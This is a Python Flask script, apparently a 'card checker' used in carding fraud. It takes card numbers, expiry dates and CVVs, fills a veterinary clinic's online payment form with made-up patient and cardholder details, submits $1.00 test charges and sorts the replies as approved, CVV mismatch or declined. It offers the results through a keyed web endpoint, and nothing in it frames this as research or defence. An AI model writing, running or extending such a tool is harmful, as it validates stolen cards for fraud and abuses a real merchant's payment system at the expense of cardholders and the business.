import sys
import re
import random
import requests
from bs4 import BeautifulSoup
import json
from flask import Flask, request, jsonify

# --- Payment Config ---
DOMAIN = "https://northstarvets.com"

# Approval patterns for Auth.net responses
approved_patterns = [
    'Transaction Approved',
    'Payment Successful',
    'Transaction Complete',
    'Approved',
    'Success',
    'Payment Processed',
    'Thank you for your payment'
]

# CCN patterns for Auth.net
CCN_patterns = [
    'CVV',
    'Card Code',
    'Security Code',
    'CVV2',
    'CVC',
    'cvv does not match',
    'security code'
]

# Declined patterns
declined_patterns = [
    'FAILED',
    'declined',
    'Declined',
    'Transaction Declined',
    'Card Declined',
    'Insufficient Funds',
    'Invalid Card',
    'Expired Card',
    'This transaction has been declined'
]

def generate_cardholder_name():
    """Generate random cardholder name"""
    first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Lisa', 'Robert', 'Emily', 'James', 'Ashley']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def get_card_type(cc):
    """Determine card type from card number"""
    if cc.startswith('4'):
        return 'V'  # Visa
    elif cc.startswith(('5', '2')):
        return 'M'  # Mastercard
    elif cc.startswith('3'):
        return 'A'  # Amex
    else:
        return 'V'  # Default to Visa

def convert_year(year):
    """Convert YY to YYYY format"""
    if len(year) == 2:
        year_int = int(year)
        current_century = 2000
        if year_int < 50:  # Assume years 00-49 are 2000-2049
            return str(current_century + year_int)
        else:  # Years 50-99 are 1950-1999
            return str(1900 + year_int)
    return year  # Already YYYY format

def ppc(card):
    try:
        parts = card.split("|")
        if len(parts) != 4:
            return json.dumps({"error": "Invalid card format"})
            
        cc, mon, year, cvv = parts
        
        # Convert YY to YYYY
        year = convert_year(year)
        
        # Validate card number
        if not re.match(r'^\d{13,19}$', cc):
            return json.dumps({"error": "Invalid card number"})
        
        # Generate cardholder name and card type
        ccname = generate_cardholder_name()
        cctype = get_card_type(cc)
        
        # Prepare payment data
        data = {
            'type_of_payment': 'Other',
            'other_desc': 'New',
            'office_location': 'Robbinsville',
            'invoice_num': str(random.randint(1000000, 9999999)),
            'amount': '1.00',
            'email': 'xcracker08@gmail.com',
            'phone_num': '7626527627',
            'patient_id': str(random.randint(10000000, 99999999)),
            'patient_name': ccname,
            'fname': ccname.split()[0],
            'lname': ccname.split()[1],
            'address': '123 Main St',
            'city': 'New York',
            'state': 'NY',
            'zip': '10001',
            'cctype': cctype,
            'ccn': cc,
            'ccname': ccname,
            'exp1': mon.zfill(2),
            'exp2': year,
            'cvv': cvv,
            'process': 'yes',
        }
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-GB,en;q=0.9',
            'Origin': DOMAIN,
            'Referer': f'{DOMAIN}/payment/index.php',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = requests.post(
            f'{DOMAIN}/payment/index.php',
            headers=headers,
            data=data,
            timeout=30
        )
        
        if response.status_code != 200:
            return json.dumps({"error": f"HTTP {response.status_code}"})
            
        return response.text
        
    except Exception as e:
        return json.dumps({"error": f"Processing error: {str(e)}"})

def parse_result(result):
    try:
        # Check if it's a JSON error response
        try:
            data = json.loads(result)
            if "error" in data:
                return "ERROR", data["error"]
        except json.JSONDecodeError:
            pass
        
        # Parse HTML response
        soup = BeautifulSoup(result, 'html.parser')
        
        # Get all text content
        full_text = soup.get_text()
        
        # Check for specific error pattern: "Error!Your payment wasFAILED!Error Code : 2Error Message : This transaction has been declined"
        if "FAILED" in full_text and "Error Message" in full_text:
            # Extract error message
            error_match = re.search(r'Error Message\s*:\s*([^.]+)', full_text)
            if error_match:
                error_message = error_match.group(1).strip()
                return "DECLINED", error_message
            else:
                return "DECLINED", "This transaction has been declined"
        
        # Look for different message containers
        message_text = ""
        
        # Check for error messages
        error_div = soup.find('div', class_='message error')
        if error_div:
            message_text = error_div.get_text(strip=True)
        
        # Check for success messages
        success_div = soup.find('div', class_='message success')
        if success_div:
            message_text = success_div.get_text(strip=True)
        
        # Check for other common message containers
        if not message_text:
            for selector in ['.alert', '.notification', '.response', '.result']:
                element = soup.select_one(selector)
                if element:
                    message_text = element.get_text(strip=True)
                    break
        
        # If no specific message found, use the full text but clean it up
        if not message_text:
            cleaned_text = re.sub(r'\s+', ' ', full_text).strip()
            
            # Look for error patterns in the text
            if "FAILED" in cleaned_text:
                return "DECLINED", "Payment Failed"
            elif any(pattern.lower() in cleaned_text.lower() for pattern in declined_patterns):
                # Find the specific decline reason
                for pattern in declined_patterns:
                    if pattern.lower() in cleaned_text.lower():
                        return "DECLINED", pattern
            
            message_text = cleaned_text[:100] + "..." if len(cleaned_text) > 100 else cleaned_text
        
        # Check for approval patterns
        for pattern in approved_patterns:
            if pattern.lower() in message_text.lower():
                return "APPROVED", message_text
        
        # Check for CCN patterns
        for pattern in CCN_patterns:
            if pattern.lower() in message_text.lower():
                return "CCN", message_text
        
        # Check for declined patterns
        for pattern in declined_patterns:
            if pattern.lower() in message_text.lower():
                return "DECLINED", message_text
        
        # Default classification based on common keywords
        if any(word in message_text.lower() for word in ['success', 'approved', 'complete', 'thank']):
            return "APPROVED", message_text
        elif any(word in message_text.lower() for word in ['cvv', 'cvc', 'security', 'code']):
            return "CCN", message_text
        else:
            return "DECLINED", message_text
            
    except Exception as e:
        return "ERROR", f"Parse error: {str(e)}"

def get_error_code(status):
    """Map status to error code"""
    if status == "APPROVED":
        return "100"  # Success code
    elif status == "DECLINED":
        return "251"  # Declined code as requested
    elif status == "CCN":
        return "200"  # CVV/CVN issue code
    else:  # ERROR or any other status
        return "0"    # General error code

def main(card):
    result = ppc(card)
    status, message = parse_result(result)
    error_code = get_error_code(status)
    formatted_response = f"{message}({error_code})"
    return {"response": formatted_response}

app = Flask(__name__)

@app.route('/gateway=authnet1$/key=rockysoon')
def check_card():
    cc = request.args.get('cc')
    if not cc:
        return jsonify({"response": "Missing cc parameter(0)"})
    
    result = main(cc)
    return jsonify(result)

if __name__ == '__main__':
    app.run(debug=True)
